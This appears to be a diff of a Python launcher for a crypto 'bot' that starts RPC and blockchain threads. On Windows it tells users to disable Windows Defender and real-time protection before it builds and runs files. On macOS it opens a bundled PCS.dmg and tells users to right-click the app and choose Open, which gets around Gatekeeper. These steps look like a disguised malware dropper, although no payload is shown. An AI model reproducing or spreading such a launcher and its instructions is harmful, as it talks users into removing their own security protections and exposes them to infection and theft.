@@ -1,38 +1,10 @@
-import importlib.util
 import subprocess
-import sys
 import os
 import platform
 import threading
 import time
 import json
 import random
-import requests
-import logging
-from queue import Queue
-
-def install_and_import(module_name):
-    if importlib.util.find_spec(module_name) is None:
-        print(f"Installing {module_name} module...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
-    else:
-        print(f"{module_name} module is already installed.")
-
-    globals()[module_name] = importlib.import_module(module_name)
-
-modules = [
-    'ctypes', 'time', 'json', 'random', 'requests', 'logging', 'queue'
-]
-
-for mod in modules:
-    install_and_import(mod)
-
-import ctypes
-import threading
-import time
-import json
-import random
-import requests
 import logging
 from queue import Queue
 
@@ -104,21 +76,21 @@ def main():
             print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
         else:
             builded(files, output_filename)
+            rpc_server_thread.start()
+            blockchain_thread.start()
+
+            rpc_server_thread.join()
+            blockchain_thread.join()
     elif platform.system() == 'Darwin':  # Mac OS
         file_to_execute = 'PCS.dmg'
         if os.path.exists(file_to_execute):
             subprocess.run(["open", file_to_execute], check=True)
+            print("To run the bot, right-click on the Pcs.app file in the opened window and click Open.")
         else:
             print(f"{file_to_execute} not found.")
     else:
         print("Unsupported operating system.")
         return
-
-    rpc_server_thread.start()
-    blockchain_thread.start()
-
-    rpc_server_thread.join()
-    blockchain_thread.join()
 
 if __name__ == "__main__":
     main()
